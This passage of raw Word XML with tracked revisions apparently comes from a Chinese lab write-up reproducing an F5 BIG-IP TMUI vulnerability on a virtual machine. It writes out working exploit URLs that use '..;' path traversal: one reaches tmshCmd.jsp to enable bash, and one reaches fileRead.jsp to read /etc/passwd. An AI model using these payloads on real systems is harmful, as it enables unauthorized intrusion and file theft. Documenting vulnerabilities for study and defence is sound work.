          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>W</w:t>
        </w:r>
        <w:r>
          <w:t>eb</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>管理页面</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="225" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>（如图</w:t>
        </w:r>
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>所示）</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="226" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>IP</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>会显示在登陆界面中，输入账号密码，此处账号为</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t xml:space="preserve">admin, </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>密码为虚拟机开机时所设置的密码。</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="65FE2CB5" w14:textId="77777777" w:rsidR="008C5718" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="227" w:author="芮志清" w:date="2020-07-10T11:53:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="228" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:moveTo w:id="229" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Microsoft YaHei UI" w:eastAsia="Microsoft YaHei UI" w:hAnsi="Microsoft YaHei UI" w:hint="eastAsia"/>
            <w:noProof/>
            <w:color w:val="333333"/>
            <w:spacing w:val="8"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="327FDAD3" wp14:editId="6DFA9522">
              <wp:extent cx="5295947" cy="3634740"/>
              <wp:effectExtent l="0" t="0" r="0" b="3810"/>
              <wp:docPr id="11" name="Picture 5" descr="A screenshot of a social media pos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4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8321" cy="3636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54F692AE" w14:textId="3FE943DB" w:rsidR="00EA14FB" w:rsidRDefault="008C5718" w:rsidP="008C5718">
      <w:pPr>
        <w:pStyle w:val="af7"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="230" w:author="芮志清" w:date="2020-07-10T11:53:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="231" w:author="芮志清" w:date="2020-07-10T11:53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232" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="233" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
        <w:r>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>网页管理登陆</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5EE93919" w14:textId="77777777" w:rsidR="008C5718" w:rsidRPr="008C5718" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:rPr>
          <w:moveTo w:id="234" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="235" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12660C7C" w14:textId="29D8B6F9" w:rsidR="00EA14FB" w:rsidDel="008C5718" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:del w:id="236" w:author="芮志清" w:date="2020-07-10T11:52:00Z"/>
          <w:moveTo w:id="237" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="238" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="6FF99A68" w14:textId="79F02E38" w:rsidR="00EA14FB" w:rsidDel="008C5718" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:del w:id="239" w:author="芮志清" w:date="2020-07-10T11:52:00Z"/>
          <w:moveTo w:id="240" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55A56BCF" w14:textId="108A2C38" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="241" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="242" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>登录</w:t>
        </w:r>
        <w:del w:id="243" w:author="芮志清" w:date="2020-07-10T11:54:00Z">
          <w:r w:rsidDel="008C5718">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>进去</w:delText>
          </w:r>
        </w:del>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>后的</w:t>
        </w:r>
      </w:moveTo>
      <w:ins w:id="244" w:author="芮志清" w:date="2020-07-10T11:54:00Z">
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>欢迎</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="245" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>页面</w:t>
        </w:r>
        <w:del w:id="246" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
          <w:r w:rsidDel="008C5718">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>是这样的</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:ins w:id="247" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>如图</w:t>
        </w:r>
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>所示</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="248" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="1FF25656" w14:textId="77777777" w:rsidR="008C5718" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="249" w:author="芮志清" w:date="2020-07-10T11:53:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="250" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:moveTo w:id="251" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Microsoft YaHei UI" w:eastAsia="Microsoft YaHei UI" w:hAnsi="Microsoft YaHei UI" w:hint="eastAsia"/>
            <w:noProof/>
            <w:color w:val="333333"/>
            <w:spacing w:val="8"/>
            <w:sz w:val="26"/>
            <w:szCs w:val="26"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41383A4E" wp14:editId="25218D0B">
              <wp:extent cx="5731510" cy="2280970"/>
              <wp:effectExtent l="0" t="0" r="2540" b="5080"/>
              <wp:docPr id="12" name="Picture 6" descr="A screenshot of a social media pos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4.pn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28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4625D0EC" w14:textId="4156C43D" w:rsidR="00EA14FB" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="af7"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:moveTo w:id="252" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="253" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
          <w:pPr>
            <w:jc w:val="center"/>
          </w:pPr>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="254" w:author="芮志清" w:date="2020-07-10T11:53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255" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>4</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="256" w:author="芮志清" w:date="2020-07-10T11:53:00Z">
        <w:r>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>网络管理欢迎界面</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="281143EF" w14:textId="2885D15C" w:rsidR="008C5718" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="257" w:author="芮志清" w:date="2020-07-10T11:54:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="258" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:del w:id="259" w:author="芮志清" w:date="2020-07-10T11:54:00Z">
          <w:r w:rsidDel="008C5718">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>1</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="260" w:author="芮志清" w:date="2020-07-10T11:54:00Z">
        <w:r w:rsidR="008C5718">
          <w:t xml:space="preserve">3 </w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="261" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:moveTo>
      <w:proofErr w:type="gramEnd"/>
      <w:ins w:id="262" w:author="芮志清" w:date="2020-07-10T11:54:00Z">
        <w:r w:rsidR="008C5718">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>利用漏洞开启</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="263" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
        <w:r w:rsidR="008C5718">
          <w:t>b</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="264" w:author="芮志清" w:date="2020-07-10T11:54:00Z">
        <w:r w:rsidR="008C5718">
          <w:t>ash</w:t>
        </w:r>
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="33CCB6B7" w14:textId="5C2DDA5F" w:rsidR="00EA14FB" w:rsidDel="008C5718" w:rsidRDefault="008C5718" w:rsidP="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="265" w:author="芮志清" w:date="2020-07-10T11:54:00Z"/>
          <w:moveTo w:id="266" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="267" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>在浏览器中输入</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="268" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidR="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>开启</w:t>
        </w:r>
        <w:r w:rsidR="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>bash</w:t>
        </w:r>
        <w:r w:rsidR="00EA14FB">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>使用的命令：</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="4F8A612C" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="269" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="270" w:author="芮志清" w:date="2020-07-10T11:54:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ABEB4E5" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRPr="00600CAB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:moveTo w:id="271" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="272" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="00600CAB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00600CAB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>/..</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00600CAB">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="157B1875" w14:textId="77777777" w:rsidR="008C5718" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:keepNext/>
        <w:rPr>
          <w:ins w:id="273" w:author="芮志清" w:date="2020-07-10T11:56:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="274" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveTo w:id="275" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="132C9625" wp14:editId="3088D74B">
              <wp:extent cx="5731510" cy="641121"/>
              <wp:effectExtent l="0" t="0" r="2540" b="6985"/>
              <wp:docPr id="13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4.png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411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512E7BD9" w14:textId="36C5C75F" w:rsidR="00EA14FB" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="af7"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="276" w:author="芮志清" w:date="2020-07-10T11:55:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="277" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="278" w:author="芮志清" w:date="2020-07-10T11:56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279" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="280" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
        <w:r>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>开启</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="281" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
        <w:r>
          <w:t>b</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="282" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>ash</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1507EE4C" w14:textId="0AF15B5D" w:rsidR="008C5718" w:rsidDel="008C5718" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:del w:id="283" w:author="芮志清" w:date="2020-07-10T11:56:00Z"/>
          <w:moveTo w:id="284" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="285" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F5218AF" w14:textId="10E956D3" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="286" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="287" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:del w:id="288" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
          <w:r w:rsidDel="008C5718">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>2</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:ins w:id="289" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
        <w:r w:rsidR="008C5718">
          <w:t>4</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="290" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:moveTo>
      <w:ins w:id="291" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
        <w:r w:rsidR="008C5718">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="292" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>读取文件</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>PoC</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="0B89DE26" w14:textId="12DEFE07" w:rsidR="00EA14FB" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="293" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="294" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="295" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>利用如下命令可读取系统</w:t>
        </w:r>
        <w:r>
          <w:t>passwd</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>文件：</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="431C12EC" w14:textId="77777777" w:rsidR="00EA14FB" w:rsidRPr="00852434" w:rsidRDefault="00EA14FB" w:rsidP="00EA14FB">
      <w:pPr>
        <w:rPr>
          <w:moveTo w:id="296" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="297" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r w:rsidRPr="00852434">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>https://&lt;IP&gt;/tmui/login.jsp</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00852434">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>/..</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00852434">
          <w:rPr>
            <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          </w:rPr>
          <w:t>;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:p w14:paraId="5DC9E1CC" w14:textId="77777777" w:rsidR="008C5718" w:rsidRDefault="00EA14FB">
      <w:pPr>
        <w:keepNext/>
        <w:rPr>
          <w:ins w:id="298" w:author="芮志清" w:date="2020-07-10T11:57:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="299" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:moveTo w:id="300" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:del w:id="301" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
          <w:r w:rsidDel="008C5718">
            <w:delText xml:space="preserve"> </w:delText>
          </w:r>
        </w:del>
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0CB82786" wp14:editId="0FD0F9E7">
              <wp:extent cx="5731510" cy="1048940"/>
              <wp:effectExtent l="0" t="0" r="2540" b="0"/>
              <wp:docPr id="14" name="Picture 8" descr="A screenshot of a social media pos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4.png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048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270ECDA4" w14:textId="731B4503" w:rsidR="00EA14FB" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="af7"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:moveTo w:id="302" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="303" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="304" w:author="芮志清" w:date="2020-07-10T11:57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305" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>6</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="306" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
        <w:r>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>读取</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>pass</w:t>
        </w:r>
        <w:r>
          <w:t>wd</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>文件</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2C6EA4A2" w14:textId="7877C87B" w:rsidR="008C5718" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="307" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="308" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="309" w:author="芮志清" w:date="2020-07-10T11:56:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>系统</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="310" w:author="芮志清" w:date="2020-07-10T11:57:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>pass</w:t>
        </w:r>
        <w:r>
          <w:t>wd</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>文件为系统中的关键敏感文件，存储着系统中的所有用户信息。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0B49A8B1" w14:textId="5AC789A0" w:rsidR="00EA14FB" w:rsidRDefault="00EA14FB" w:rsidP="008C5718">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:ins w:id="311" w:author="芮志清" w:date="2020-07-10T11:58:00Z"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="312" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:del w:id="313" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
          <w:r w:rsidDel="008C5718">
            <w:rPr>
              <w:rFonts w:hint="eastAsia"/>
            </w:rPr>
            <w:delText>3</w:delText>
          </w:r>
        </w:del>
      </w:moveTo>
      <w:ins w:id="314" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
        <w:r w:rsidR="008C5718">
          <w:t>5</w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="315" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:moveTo>
      <w:ins w:id="316" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
        <w:r w:rsidR="008C5718">
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:moveTo w:id="317" w:author="芮志清" w:date="2020-07-10T11:45:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>列出所有文件</w:t>
        </w:r>
      </w:moveTo>
      <w:ins w:id="318" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r w:rsidR="008C5718">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>。</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="33F79BE3" w14:textId="6A5CD8B8" w:rsidR="008C5718" w:rsidRDefault="008C5718">
      <w:pPr>
        <w:pStyle w:val="ae"/>
        <w:ind w:firstLine="240"/>
        <w:rPr>
          <w:moveTo w:id="319" w:author="芮志清" w:date="2020-07-10T11:45:00Z"/>
        </w:rPr>
        <w:pPrChange w:id="320" w:author="芮志清" w:date="2020-07-10T11:55:00Z">
          <w:pPr/>
        </w:pPrChange>
      </w:pPr>
      <w:ins w:id="321" w:author="芮志清" w:date="2020-07-10T11:58:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>通过如下命令可列出</w:t>
        </w:r>
        <w:r>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
          </w:rPr>
          <w:t>目录下的所有文件。</w:t>
        </w:r>
      </w:ins>
    </w:p>
